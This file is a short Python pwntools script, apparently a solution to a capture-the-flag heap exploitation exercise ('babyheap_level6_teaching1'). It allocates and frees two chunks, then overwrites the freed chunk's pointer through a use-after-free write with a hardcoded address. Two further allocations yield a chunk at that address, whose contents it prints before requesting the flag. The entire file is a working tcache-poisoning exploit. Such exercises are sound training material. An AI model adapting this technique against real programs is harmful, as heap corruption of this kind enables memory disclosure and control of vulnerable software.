#!/usr/bin/env python3

from pwn import *

p = process('/babyheap_level6_teaching1')

p.sendline(b'malloc')
p.sendline(b'0')
p.sendline(b'32')

p.sendline(b'malloc')
p.sendline(b'1')
p.sendline(b'32')

p.sendline(b'free')
p.sendline(b'0')

p.sendline(b'free')
p.sendline(b'1')

p.sendline(b'scanf')
p.sendline(b'1')
p.sendline(p64(0x429521))

p.sendline(b'malloc')
p.sendline(b'0')
p.sendline(b'32')

p.sendline(b'malloc')
p.sendline(b'1')
p.sendline(b'32')

p.sendline(b'puts')
p.sendline(b'1')

p.sendline(b'send_flag')
p.interactive()
